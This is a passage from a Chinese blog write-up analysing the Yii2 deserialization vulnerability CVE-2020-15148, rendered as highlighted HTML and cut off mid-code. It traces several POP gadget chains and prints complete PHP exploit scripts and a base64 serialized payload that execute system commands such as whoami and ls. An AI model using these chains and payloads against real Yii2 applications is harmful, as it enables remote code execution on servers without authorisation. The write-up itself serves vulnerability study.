keyword">namespace</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">FnStream</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> <span class="token variable">$_fn_close</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7<span class="token punctuation">\</span>FnStream</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span>  <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FnStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BatchQueryResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoyNDoiR3V6emxlSHR0cFxQc3I3XEZuU3RyZWFtIjoxOntzOjk6Il9mbl9jbG9zZSI7czo3OiJwaHBpbmZvIjt9fQ==</span><span class="token punctuation">&#125;</span></span></code></pre><p>执行效果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210513172934351.png" alt loading="lazy"></p><p>我们需要对危害进行放大，这里就需要一个执行类，拿这个<code>call_user_func</code>函数作跳板，来进行代码执行，全局搜索eval，找到一个<code>MockTrait.php</code>文件在<code>vendor\phpunit\phpunit\src\Framework\MockObject</code>下，代码如下：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function"><span class="token punctuation">\</span>class_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mockName</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">classCode</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mockName</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><code>$this-&gt;classCode</code>和<code>$this-&gt;mockName</code>都可控</p><p>于是即可构造完整的<code>pop</code>链</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name class-name-fully-qualified static-context">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token operator">::</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token class-name class-name-fully-qualified static-context">GuzzleHttp<span class="token punctuation">\</span>Psr7<span class="token punctuation">\</span>FnStream</span><span class="token operator">::</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token property">call_user_func</span><span class="token operator">-></span><span class="token class-name class-name-fully-qualified static-context">PHPUnit<span class="token punctuation">\</span>Framework<span class="token punctuation">\</span>MockObject<span class="token punctuation">\</span>MockTrait</span><span class="token operator">::</span><span class="token constant">generate</span><span class="token operator">-></span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>Exp</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">PHPUnit<span class="token punctuation">\</span>Framework<span class="token punctuation">\</span>MockObject</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">MockTrait</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$classCode</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system('whoami');"</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$mockName</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"extrader"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">PHPUnit<span class="token punctuation">\</span>Framework<span class="token punctuation">\</span>MockObject<span class="token punctuation">\</span>MockTrait</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">FnStream</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> <span class="token variable">$_fn_close</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_fn_close</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>                <span class="token keyword">new</span> <span class="token class-name">MockTrait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token string single-quoted-string">'generate'</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7<span class="token punctuation">\</span>FnStream</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span>  <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FnStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BatchQueryResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>然而代码并没有执行成功，看到报错信息</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210513175847226.png" alt loading="lazy"></p><p><code>__wakeup</code>方法<code>throw</code>出去了，当然<code>__wakeup</code>可绕，前提是PHP5 &lt; 5.6.25，7.x &lt; 7.0.10之前，具体绕过方法网上很多，这里不再赘述，执行效果如下</p><p>paylaod:</p><pre class="language-none"><code class="language-none">TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoyNDoiR3V6emxlSHR0cFxQc3I3XEZuU3RyZWFtIjoyOntzOjk6Il9mbl9jbG9zZSI7YToyOntpOjA7TzozODoiUEhQVW5pdFxGcmFtZXdvcmtcTW9ja09iamVjdFxNb2NrVHJhaXQiOjI6e3M6NDk6IgBQSFBVbml0XEZyYW1ld29ya1xNb2NrT2JqZWN0XE1vY2tUcmFpdABjbGFzc0NvZGUiO3M6MTc6InN5c3RlbSgnd2hvYW1pJyk7IjtzOjQ4OiIAUEhQVW5pdFxGcmFtZXdvcmtcTW9ja09iamVjdFxNb2NrVHJhaXQAbW9ja05hbWUiO3M6ODoiZXh0cmFkZXIiO31pOjE7czo4OiJnZW5lcmF0ZSI7fX19</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210513182520433.png" alt loading="lazy"></p><p>这里就疑惑了，我这里php明明是php7.4的环境，为什么也可以绕？？？</p><p>既然<code>__wakeup</code>可绕，那<code>2.0.38</code>版本修复的方法就是加一个<code>__wakeup</code>方法，是不是也可以直接绕？在github上又把<code>2.0.38</code>版本的源码下下来，然后用构造好的绕过<code>__wakeup</code>的payload测试，直接没回显了，报错也没了，有点迷，有点迷。。。</p><h3 id="2-0-38反序列化"><a href="#2-0-38反序列化" class="headerlink" title="2.0.38反序列化"></a>2.0.38反序列化</h3><p>此处参考<a href="https://v0w.top/2020/09/22/Yii2unserialize/#0x03-%E6%96%B0%E7%89%88%E6%9C%AC2-0-38%E4%B8%8B%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">链接</a>，师傅很强，学习了！</p><h4 id="POP3"><a href="#POP3" class="headerlink" title="POP3"></a>POP3</h4><p>利用点在<code>vendor/codeception/codeception/ext/RunProcess.php:93</code></p><p>里面有这两个方法</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">stopProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">stopProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">processes</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$process</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/** @var $process Process  **/</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$process</span><span class="token operator">-></span><span class="token function">isRunning</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">output</span><span class="token operator">-></span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'[RunProcess] Stopping '</span> <span class="token operator">.</span> <span class="token variable">$process</span><span class="token operator">-></span><span class="token function">getCommandLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$process</span><span class="token operator">-></span><span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">processes</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>对象在销毁的时候，触发<code>__destruct</code>方法，<code>__destruct</code>方法调用了<code>stopProcess</code>方法，<code>stopProcess</code>方法中的<code>$this-&gt;processes</code>可控，即<code>$process</code>也可控，<code>$process</code>会调用<code>isRunning()</code>方法，那么这里就可以尝试利用<code>__call</code>方法了，可以接着上面的<code>POP1</code>链利用</p><p>完整的<code>pop</code>链如下：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Codeception<span class="token punctuation">\</span>Extension<span class="token punctuation">\</span>RunProcess</span><span class="token operator">::</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">stopProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token variable">$process</span><span class="token operator">-></span><span class="token function">isRunning</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token class-name class-name-fully-qualified static-context">Faker<span class="token punctuation">\</span>Generator</span><span class="token operator">::</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token operator">::</span><span class="token constant">run</span><span class="token operator">-></span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>Exp</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// EXP3: RunProcess -> ... -> __call()</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexAction</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ls -al'</span><span class="token punctuation">;</span>           <span class="token comment">//command</span>            <span class="token comment">// run() -> call_user_func($this->checkAccess, $this->id);</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isRunning'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">IndexAction</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment">//stopProcess方法里又调用了isRunning()方法: $process->isRunning()</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">RunProcess</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$processes</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">processes</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension<span class="token punctuation">\</span>RunProcess</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RunProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>请求结果如下，成功命令执行</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210513193606816.png" alt loading="lazy"></p><h4 id="POP4"><a href="#POP4" class="headerlink" title="POP4"></a>POP4</h4><p>利用点在<code>vendor\swiftmailer\swiftmailer\lib\classes\Swift\KeyCache\DiskKeyCache.php</code>中</p><p>主要代码如下：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span> <span class="token keyword">as</span> <span class="token variable">$nsKey</span> <span class="token operator">=></span> <span class="token variable">$null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">clearAll</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">clearAll</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span><span class="token punctuation">[</span><span class="token variable">$nsKey</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$itemKey</span> <span class="token operator">=></span> <span class="token variable">$null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">clearKey</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">,</span> <span class="token variable">$itemKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">path</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$nsKey</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">rmdir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">path</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$nsKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span><span class="token punctuation">[</span><span class="token variable">$nsKey</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">clearKey</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">,</span> <span class="token variable">$itemKey</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">hasKey</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">,</span> <span class="token variable">$itemKey</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">freeHandle</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">,</span> <span class="token variable">$itemKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">path</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$nsKey</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$itemKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><code>unlink</code>使用拼接字符串，<code>$this-&gt;path</code>可控，即可想到调用<code>__toString</code>方法（当一个对象被当做字符串使用时被调用）</p><p>全局查找<code>__toString()</code>方法，最好找一些<strong>调用其他类函数</strong>的<code>__toString</code></p><p>有如下的几个类中的<code>__toString</code>方法可用：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Codeception<span class="token punctuation">\</span>Util<span class="token punctuation">\</span>XmlBuilder</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>DOMDocument</span><span class="token operator">::</span><span class="token constant">saveXML</span> 可以触发__call方法<span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags<span class="token punctuation">\</span>Covers</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token property">render</span> 可以触发__call方法<span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags<span class="token punctuation">\</span>Deprecated</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token property">render</span> 可以触发__call方法<span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags<span class="token punctuation">\</span>Generic</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token property">render</span> 可以触发__call方法<span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags<span class="token punctuation">\</span>See</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token property">render</span>可以触发__call方法<span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags<span class="token punctuation">\</span>Link</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token property">render</span><span class="token operator">...</span></code></pre><p>这里以<code>\Codeception\Util\XmlBuilder::__toString</code>为例</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">__dom__</span><span class="token operator">-></span><span class="token function">saveXML</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><code>$this-&gt;__dom__</code>可控，在调用<code>saveXML()</code>方法的时候会调用<code>__call</code>方法。</p><p>pop链如下：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Swift_KeyCache_DiskKeyCache</span><span class="token operator">::</span><span class="token constant">__destruct</span> <span class="token operator">-></span> <span class="token property">clearAll</span> <span class="token operator">-></span> <span class="token property">clearKey</span> <span class="token operator">-></span> <span class="token property">__toString</span><span class="token operator">-></span> <span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Codeception<span class="token punctuation">\</span>Util<span class="token punctuation">\</span>XmlBuilder</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token property">saveXML</span><span class="token operator">-></span> <span class="token class-name class-name-fully-qualified static-context">Faker<span class="token punctuation">\</span>Generator</span><span class="token operator">::</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token operator">::</span><span class="token constant">run</span> <span class="token operator">-></span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>Exp</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// EXP: Swift_KeyCache_DiskKeyCache::__destruct -> __toString -> __call</span><span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Codeception<span class="token punctuation">\</span>Util<span class="token punctuation">\</span>XmlBuilder</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token package">phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags<span class="token punctuation">\</span>Covers</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Swift_KeyCache_DiskKeyCache</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$path</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$keys</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>                <span class="token string 